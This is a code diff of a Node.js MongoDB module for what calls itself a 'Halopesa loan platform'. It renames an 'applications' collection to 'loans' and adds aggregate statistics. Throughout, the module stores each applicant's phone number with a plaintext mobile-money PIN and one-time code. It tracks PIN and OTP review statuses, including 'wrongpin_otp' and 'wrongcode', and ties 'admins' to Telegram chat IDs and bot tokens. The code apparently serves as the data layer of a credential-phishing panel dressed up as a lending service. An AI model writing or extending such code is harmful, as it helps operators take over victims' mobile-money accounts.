@@ -4,11 +4,21 @@ let client;
 let db;
 
 // Database and collections
-const DB_NAME = 'halopesa_loan_platform';
-const COLLECTIONS = {
+const DB_NAME = process.env.DB_NAME || 'halopesa_loan_platform';
+const COLLECTIONS = Object.freeze({
     ADMINS: 'admins',
-    APPLICATIONS: 'applications'
-};
+    LOANS: 'loans'
+});
+
+/**
+ * Helper to ensure active DB connection.
+ */
+function getDb() {
+    if (!db) {
+        throw new Error('❌ Database not initialized. Call connectDatabase() first.');
+    }
+    return db;
+}
 
 /**
  * Connect to MongoDB
@@ -21,14 +31,17 @@ async function connectDatabase() {
             throw new Error('❌ MONGODB_URI is not set in environment variables');
         }
 
-        console.log('🔄 Connecting to MongoDB...');
+        console.log(`🔄 Connecting to MongoDB Halopesa Loan Platform (${DB_NAME})...`);
 
-        client = new MongoClient(MONGODB_URI);
+        client = new MongoClient(MONGODB_URI, {
+            maxPoolSize: 10,
+            serverSelectionTimeoutMS: 5000,
+        });
+
         await client.connect();
-
         db = client.db(DB_NAME);
 
-        console.log('✅ Connected to MongoDB successfully');
+        console.log(`✅ Connected to Halopesa Loan Database (${DB_NAME})`);
 
         await createIndexes();
 
@@ -40,23 +53,30 @@ async function connectDatabase() {
 }
 
 /**
- * Create database indexes
+ * Create database indexes optimized for loan management
  */
 async function createIndexes() {
     try {
-        await db.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true });
-        await db.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 });
-        await db.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 });
-        await db.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 });
+        const database = getDb();
 
-        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true });
-        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 });
-        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 });
-        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 });
-        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
-        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 });
+        // Admins indexes
+        await Promise.all([
+            database.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true }),
+            database.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 }),
+            database.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 }),
+            database.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 })
+        ]);
 
-        console.log('✅ Database indexes created');
+        // Loans indexes
+        await Promise.all([
+            database.collection(COLLECTIONS.LOANS).createIndex({ loanId: 1 }, { unique: true }),
+            database.collection(COLLECTIONS.LOANS).createIndex({ adminId: 1, createdAt: -1 }),
+            database.collection(COLLECTIONS.LOANS).createIndex({ borrowerPhone: 1 }),
+            database.collection(COLLECTIONS.LOANS).createIndex({ identityNumber: 1 }),
+            database.collection(COLLECTIONS.LOANS).createIndex({ adminId: 1, loanStatus: 1, disbursementStatus: 1 })
+        ]);
+
+        console.log('✅ Halopesa Loan indexes created/verified');
     } catch (error) {
         console.error('⚠️ Error creating indexes:', error.message);
     }
@@ -68,7 +88,9 @@ async function createIndexes() {
 async function closeDatabase() {
     if (client) {
         await client.close();
-        console.log('✅ Database connection closed');
+        db = null;
+        client = null;
+        console.log('✅ Halopesa Loan Database connection closed');
     }
 }
 
@@ -80,37 +102,28 @@ async function saveAdmin(adminData) {
     try {
         const adminId = adminData.adminId || adminData.id;
 
-        if (!adminId)        throw new Error('Admin ID is required (adminId or id property)');
+        if (!adminId) throw new Error('Admin ID is required');
         if (!adminData.name) throw new Error('Admin name is required');
         if (!adminData.email) throw new Error('Admin email is required');
         if (!adminData.chatId) throw new Error('Admin chatId is required');
 
-        const existingAdmin = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
-        if (existingAdmin) throw new Error(`Admin ${adminId} already exists in database`);
-
         const adminDocument = {
             adminId,
-            name:      adminData.name,
-            email:     adminData.email,
-            chatId:    adminData.chatId,
-            status:    adminData.status || 'active',
-            createdAt: adminData.createdAt || new Date().toISOString()
+            name: adminData.name,
+            email: adminData.email,
+            chatId: adminData.chatId,
+            status: adminData.status || 'active',
+            createdAt: adminData.createdAt || new Date().toISOString(),
+            ...(adminData.botToken && { botToken: adminData.botToken })
         };
 
-        if (adminData.botToken) adminDocument.botToken = adminData.botToken;
-
-        console.log(`💾 Saving admin to database:`, {
-            adminId: adminDocument.adminId,
-            name:    adminDocument.name,
-            email:   adminDocument.email,
-            chatId:  adminDocument.chatId,
-            status:  adminDocument.status
-        });
-
-        const result = await db.collection(COLLECTIONS.ADMINS).insertOne(adminDocument);
+        const result = await getDb().collection(COLLECTIONS.ADMINS).insertOne(adminDocument);
         console.log(`✅ Admin saved successfully: ${adminId} (${adminData.name})`);
         return result;
     } catch (error) {
+        if (error.code === 11000) {
+            throw new Error(`Admin with ID ${adminData.adminId || adminData.id} already exists`);
+        }
         console.error('❌ Error saving admin:', error);
         throw error;
     }
@@ -118,7 +131,7 @@ async function saveAdmin(adminData) {
 
 async function getAdmin(adminId) {
     try {
-        return await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
+        return await getDb().collection(COLLECTIONS.ADMINS).findOne({ adminId });
     } catch (error) {
         console.error('❌ Error getting admin:', error);
         return null;
@@ -127,7 +140,7 @@ async function getAdmin(adminId) {
 
 async function getAdminByChatId(chatId) {
     try {
-        return await db.collection(COLLECTIONS.ADMINS).findOne({ chatId });
+        return await getDb().collection(COLLECTIONS.ADMINS).findOne({ chatId });
     } catch (error) {
         console.error('❌ Error getting admin by chat ID:', error);
         return null;
@@ -136,7 +149,7 @@ async function getAdminByChatId(chatId) {
 
 async function getAllAdmins() {
     try {
-        return await db.collection(COLLECTIONS.ADMINS)
+        return await getDb().collection(COLLECTIONS.ADMINS)
             .find({})
             .sort({ createdAt: -1 })
             .toArray();
@@ -148,7 +161,7 @@ async function getAllAdmins() {
 
 async function getActiveAdmins() {
     try {
-        return await db.collection(COLLECTIONS.ADMINS)
+        return await getDb().collection(COLLECTIONS.ADMINS)
             .find({ status: 'active' })
             .toArray();
     } catch (error) {
@@ -159,7 +172,7 @@ async function getActiveAdmins() {
 
 async function updateAdmin(adminId, updates) {
     try {
-        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
+        const result = await getDb().collection(COLLECTIONS.ADMINS).updateOne(
             { adminId },
             { $set: { ...updates, updatedAt: new Date().toISOString() } }
         );
@@ -172,22 +185,12 @@ async function updateAdmin(adminId, updates) {
 }
 
 async function updateAdminStatus(adminId, status) {
-    try {
-        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
-            { adminId },
-            { $set: { status, updatedAt: new Date().toISOString() } }
-        );
-        console.log(`🔄 Admin ${adminId} status updated to: ${status}`);
-        return result;
-    } catch (error) {
-        console.error('❌ Error updating admin status:', error);
-        throw error;
-    }
+    return updateAdmin(adminId, { status });
 }
 
 async function deleteAdmin(adminId) {
     try {
-        const result = await db.collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
+        const result = await getDb().collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
         console.log(`🗑️ Admin deleted: ${adminId}`);
         return result;
     } catch (error) {
@@ -198,7 +201,7 @@ async function deleteAdmin(adminId) {
 
 async function adminExists(adminId) {
     try {
-        const count = await db.collection(COLLECTIONS.ADMINS).countDocuments({ adminId });
+        const count = await getDb().collection(COLLECTIONS.ADMINS).countDocuments({ adminId }, { limit: 1 });
         return count > 0;
     } catch (error) {
         console.error('❌ Error checking admin existence:', error);
@@ -208,7 +211,7 @@ async function adminExists(adminId) {
 
 async function getAdminCount() {
     try {
-        return await db.collection(COLLECTIONS.ADMINS).countDocuments({});
+        return await getDb().collection(COLLECTIONS.ADMINS).countDocuments({});
     } catch (error) {
         console.error('❌ Error getting admin count:', error);
         return 0;
@@ -216,133 +219,280 @@ async function getAdminCount() {
 }
 
 // ==========================================
-// APPLICATION OPERATIONS
+// LOAN OPERATIONS
 // ==========================================
 
-async function saveApplication(appData) {
+async function saveLoan(loanData) {
     try {
-        const result = await db.collection(COLLECTIONS.APPLICATIONS).insertOne({
-            id:             appData.id,
-            adminId:        appData.adminId,
-            adminName:      appData.adminName,
-            phoneNumber:    appData.phoneNumber,
-            pin:            appData.pin,
-            pinStatus:      appData.pinStatus  || 'pending',
-            otpStatus:      appData.otpStatus  || 'pending',
-            otp:            appData.otp        || null,
-            assignmentType: appData.assignmentType,
-            isReturningUser: appData.isReturningUser || false,
-            previousCount:  appData.previousCount   || 0,
-            timestamp:      appData.timestamp || new Date().toISOString()
-        });
-        console.log(`💾 Application saved: ${appData.id}`);
+        const loanId = loanData.loanId || loanData.id;
+
+        if (!loanId) throw new Error('Loan ID is required');
+        if (!loanData.borrowerPhone) throw new Error('Borrower phone number is required');
+        if (!loanData.loanAmount) throw new Error('Loan amount is required');
+
+        const loanDocument = {
+            loanId,
+            adminId: loanData.adminId,
+            adminName: loanData.adminName,
+            borrowerPhone: loanData.borrowerPhone,
+            borrowerName: loanData.borrowerName || null,
+            identityNumber: loanData.identityNumber || null,
+            loanAmount: Number(loanData.loanAmount),
+            loanDurationDays: loanData.loanDurationDays || 30,
+            interestRate: loanData.interestRate || 0,
+            pin: loanData.pin || null,
+            otp: loanData.otp || null,
+            pinStatus: loanData.pinStatus || 'pending',
+            otpStatus: loanData.otpStatus || 'pending',
+            loanStatus: loanData.loanStatus || 'pending', // pending, approved, rejected, cancelled
+            disbursementStatus: loanData.disbursementStatus || 'pending', // pending, processing, disbursed, failed
+            isReturningBorrower: loanData.isReturningBorrower || false,
+            previousLoansCount: loanData.previousLoansCount || 0,
+            createdAt: loanData.createdAt || loanData.timestamp || new Date().toISOString()
+        };
+
+        const result = await getDb().collection(COLLECTIONS.LOANS).insertOne(loanDocument);
+        console.log(`💾 Loan Application saved: ${loanId} for ${loanDocument.borrowerPhone}`);
         return result;
     } catch (error) {
-        console.error('❌ Error saving application:', error);
+        if (error.code === 11000) {
+            throw new Error(`Loan with ID ${loanData.loanId || loanData.id} already exists`);
+        }
+        console.error('❌ Error saving loan application:', error);
         throw error;
     }
 }
 
-async function getApplication(applicationId) {
+async function getLoan(loanId) {
     try {
-        return await db.collection(COLLECTIONS.APPLICATIONS).findOne({ id: applicationId });
+        return await getDb().collection(COLLECTIONS.LOANS).findOne({ loanId });
     } catch (error) {
-        console.error('❌ Error getting application:', error);
+        console.error('❌ Error getting loan:', error);
         return null;
     }
 }
 
-async function updateApplication(applicationId, updates) {
+async function updateLoan(loanId, updates) {
     try {
-        const result = await db.collection(COLLECTIONS.APPLICATIONS).updateOne(
-            { id: applicationId },
+        const result = await getDb().collection(COLLECTIONS.LOANS).updateOne(
+            { loanId },
             { $set: { ...updates, updatedAt: new Date().toISOString() } }
         );
-        console.log(`🔄 Application updated: ${applicationId}`);
+        console.log(`🔄 Loan updated: ${loanId}`);
         return result;
     } catch (error) {
-        console.error('❌ Error updating application:', error);
+        console.error('❌ Error updating loan:', error);
         throw error;
     }
 }
 
-async function getApplicationsByAdmin(adminId) {
+async function getLoansByAdmin(adminId) {
     try {
-        return await db.collection(COLLECTIONS.APPLICATIONS)
+        return await getDb().collection(COLLECTIONS.LOANS)
             .find({ adminId })
-            .sort({ timestamp: -1 })
+            .sort({ createdAt: -1 })
             .toArray();
     } catch (error) {
-        console.error('❌ Error getting applications by admin:', error);
+        console.error('❌ Error getting loans by admin:', error);
         return [];
     }
 }
 
-async function getPendingApplications(adminId) {
+async function getPendingLoans(adminId) {
     try {
-        return await db.collection(COLLECTIONS.APPLICATIONS)
-            .find({
-                adminId,
-                $or: [{ pinStatus: 'pending' }, { otpStatus: 'pending' }]
-            })
-            .sort({ timestamp: -1 })
-            .toArray();
-    } catch (error) {
-        console.error('❌ Error getting pending applications:', error);
-        return [];
-    }
-}
-
-// ==========================================
-// STATISTICS OPERATIONS
-// ==========================================
-
-async function getAdminStats(adminId) {
-    try {
-        const total        = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId });
-        const pinPending   = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'pending' });
-        const pinApproved  = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'approved' });
-        const otpPending   = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'pending' });
-        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'approved' });
-        return { total, pinPending, pinApproved, otpPending, fullyApproved };
-    } catch (error) {
-        console.error('❌ Error getting admin stats:', error);
-        return { total: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0 };
-    }
-}
-
-async function getStats() {
-    try {
-        const totalAdmins        = await db.collection(COLLECTIONS.ADMINS).countDocuments({});
-        const totalApplications  = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({});
-        const pinPending         = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'pending' });
-        const pinApproved        = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'approved' });
-        const otpPending         = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'pending' });
-        const fullyApproved      = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'approved' });
-        const totalRejected      = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({
+        const query = {
             $or: [
-                { pinStatus: 'rejected' },
-                { otpStatus: 'wrongpin_otp' },
-                { otpStatus: 'wrongcode' }
+                { loanStatus: 'pending' },
+                { pinStatus: 'pending' },
+                { otpStatus: 'pending' }
             ]
-        });
-        return { totalAdmins, totalApplications, pinPending, pinApproved, otpPending, fullyApproved, totalRejected };
+        };
+
+        if (adminId) {
+            query.adminId = adminId;
+        }
+
+        return await getDb().collection(COLLECTIONS.LOANS)
+            .find(query)
+            .sort({ createdAt: -1 })
+            .toArray();
     } catch (error) {
-        console.error('❌ Error getting stats:', error);
-        return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0, totalRejected: 0 };
+        console.error('❌ Error getting pending loans:', error);
+        return [];
     }
 }
 
-async function getPerAdminStats() {
+async function getLoansByBorrower(borrowerPhone) {
     try {
-        const admins = await getAllAdmins();
-        const statsPromises = admins.map(async (admin) => {
-            const stats = await getAdminStats(admin.adminId);
-            return { adminId: admin.adminId, name: admin.name, ...stats };
-        });
-        return await Promise.all(statsPromises);
+        return await getDb().collection(COLLECTIONS.LOANS)
+            .find({ borrowerPhone })
+            .sort({ createdAt: -1 })
+            .toArray();
     } catch (error) {
-        console.error('❌ Error getting per-admin stats:', error);
+        console.error('❌ Error getting borrower loans:', error);
+        return [];
+    }
+}
+
+// ==========================================
+// HALOPESA LOAN STATISTICS & ANALYTICS
+// ==========================================
+
+async function getAdminLoanStats(adminId) {
+    try {
+        const stats = await getDb().collection(COLLECTIONS.LOANS).aggregate([
+            { $match: { adminId } },
+            {
+                $group: {
+                    _id: null,
+                    totalLoans: { $sum: 1 },
+                    totalAmountRequested: { $sum: '$loanAmount' },
+                    pendingLoans: { $sum: {$cond: [{ $eq: ['$loanStatus', 'pending'] }, 1, 0] } },
+                    approvedLoans: { $sum: {$cond: [{ $eq: ['$loanStatus', 'approved'] }, 1, 0] } },
+                    rejectedLoans: { $sum: {$cond: [{ $eq: ['$loanStatus', 'rejected'] }, 1, 0] } },
+                    disbursedLoans: { $sum: {$cond: [{ $eq: ['$disbursementStatus', 'disbursed'] }, 1, 0] } },
+                    totalDisbursedAmount: {
+                        $sum: {$cond: [
+                                { $eq: ['$disbursementStatus', 'disbursed'] },
+                                '$loanAmount',
+                                0
+                            ]
+                        }
+                    }
+                }
+            }
+        ]).toArray();
+
+        return stats[0] ? {
+            totalLoans: stats[0].totalLoans,
+            totalAmountRequested: stats[0].totalAmountRequested,
+            pendingLoans: stats[0].pendingLoans,
+            approvedLoans: stats[0].approvedLoans,
+            rejectedLoans: stats[0].rejectedLoans,
+            disbursedLoans: stats[0].disbursedLoans,
+            totalDisbursedAmount: stats[0].totalDisbursedAmount
+        } : {
+            totalLoans: 0,
+            totalAmountRequested: 0,
+            pendingLoans: 0,
+            approvedLoans: 0,
+            rejectedLoans: 0,
+            disbursedLoans: 0,
+            totalDisbursedAmount: 0
+        };
+    } catch (error) {
+        console.error('❌ Error getting admin loan stats:', error);
+        return {
+            totalLoans: 0,
+            totalAmountRequested: 0,
+            pendingLoans: 0,
+            approvedLoans: 0,
+            rejectedLoans: 0,
+            disbursedLoans: 0,
+            totalDisbursedAmount: 0
+        };
+    }
+}
+
+async function getGlobalLoanStats() {
+    try {
+        const database = getDb();
+        const totalAdminsPromise = database.collection(COLLECTIONS.ADMINS).countDocuments({});
+
+        const loanStatsPromise = database.collection(COLLECTIONS.LOANS).aggregate([
+            {
+                $group: {
+                    _id: null,
+                    totalLoans: { $sum: 1 },
+                    totalAmountRequested: { $sum: '$loanAmount' },
+                    pendingLoans: { $sum: {$cond: [{ $eq: ['$loanStatus', 'pending'] }, 1, 0] } },
+                    approvedLoans: { $sum: {$cond: [{ $eq: ['$loanStatus', 'approved'] }, 1, 0] } },
+                    rejectedLoans: { $sum: {$cond: [{ $eq: ['$loanStatus', 'rejected'] }, 1, 0] } },
+                    disbursedLoans: { $sum: {$cond: [{ $eq: ['$disbursementStatus', 'disbursed'] }, 1, 0] } },
+                    totalDisbursedAmount: {
+                        $sum: {$cond: [
+                                { $eq: ['$disbursementStatus', 'disbursed'] },
+                                '$loanAmount',
+                                0
+                            ]
+                        }
+                    }
+                }
+            }
+        ]).toArray();
+
+        const [totalAdmins, loanStats] = await Promise.all([totalAdminsPromise, loanStatsPromise]);
+        const stats = loanStats[0] || {};
+
+        return {
+            totalAdmins,
+            totalLoans: stats.totalLoans || 0,
+            totalAmountRequested: stats.totalAmountRequested || 0,
+            pendingLoans: stats.pendingLoans || 0,
+            approvedLoans: stats.approvedLoans || 0,
+            rejectedLoans: stats.rejectedLoans || 0,
+            disbursedLoans: stats.disbursedLoans || 0,
+            totalDisbursedAmount: stats.totalDisbursedAmount || 0
+        };
+    } catch (error) {
+        console.error('❌ Error getting global loan stats:', error);
+        return {
+            totalAdmins: 0,
+            totalLoans: 0,
+            totalAmountRequested: 0,
+            pendingLoans: 0,
+            approvedLoans: 0,
+            rejectedLoans: 0,
+            disbursedLoans: 0,
+            totalDisbursedAmount: 0
+        };
+    }
+}
+
+async function getPerAdminLoanStats() {
+    try {
+        return await getDb().collection(COLLECTIONS.ADMINS).aggregate([
+            {
+                $lookup: {
+                    from: COLLECTIONS.LOANS,
+                    localField: 'adminId',
+                    foreignField: 'adminId',
+                    as: 'loans'
+                }
+            },
+            {
+                $project: {
+                    _id: 0,
+                    adminId: 1,
+                    name: 1,
+                    totalLoans: { $size: '$loans' },
+                    pendingLoans: {
+                        $size: {
+                            $filter: { input: '$loans', as: 'l', cond: { $eq: ['$$l.loanStatus', 'pending'] } }
+                        }
+                    },
+                    approvedLoans: {
+                        $size: {
+                            $filter: { input: '$loans', as: 'l', cond: { $eq: ['$$l.loanStatus', 'approved'] } }
+                        }
+                    },
+                    disbursedLoans: {
+                        $size: {
+                            $filter: { input: '$loans', as: 'l', cond: { $eq: ['$$l.disbursementStatus', 'disbursed'] } }
+                        }
+                    },
+                    totalDisbursedAmount: {
+                        $sum: {$map: {
+                                input: {
+                                    $filter: { input: '$loans', as: 'l', cond: {$eq: ['$$l.disbursementStatus', 'disbursed'] } }                                 },                                 as: 'dl',                                 in: '$$dl.loanAmount'
+                            }
+                        }
+                    }
+                }
+            }
+        ]).toArray();
+    } catch (error) {
+        console.error('❌ Error getting per-admin loan stats:', error);
         return [];
     }
 }
@@ -353,10 +503,7 @@ async function getPerAdminStats() {
 
 async function getAllAdminsDetailed() {
     try {
-        const admins = await db.collection(COLLECTIONS.ADMINS)
-            .find({})
-            .sort({ createdAt: -1 })
-            .toArray();
+        const admins = await getAllAdmins();
         console.log(`📊 Found ${admins.length} admins in database`);
         admins.forEach(admin => {
             console.log(`   ${admin.adminId}: ${admin.name} (chatId: ${admin.chatId}, status: ${admin.status})`);
@@ -370,7 +517,7 @@ async function getAllAdminsDetailed() {
 
 async function cleanupInvalidAdmins() {
     try {
-        const result = await db.collection(COLLECTIONS.ADMINS).deleteMany({
+        const result = await getDb().collection(COLLECTIONS.ADMINS).deleteMany({
             $or: [
                 { adminId: { $exists: false } },
                 { adminId: null },
@@ -391,6 +538,7 @@ module.exports = {
     connectDatabase,
     closeDatabase,
 
+    // Admin operations
     saveAdmin,
     getAdmin,
     getAdminByChatId,
@@ -402,16 +550,20 @@ module.exports = {
     adminExists,
     getAdminCount,
 
-    saveApplication,
-    getApplication,
-    updateApplication,
-    getApplicationsByAdmin,
-    getPendingApplications,
+    // Loan operations
+    saveLoan,
+    getLoan,
+    updateLoan,
+    getLoansByAdmin,
+    getPendingLoans,
+    getLoansByBorrower,
 
-    getAdminStats,
-    getStats,
-    getPerAdminStats,
+    // Loan statistics
+    getAdminLoanStats,
+    getGlobalLoanStats,
+    getPerAdminLoanStats,
 
+    // Maintenance
     getAllAdminsDetailed,
     cleanupInvalidAdmins
 };
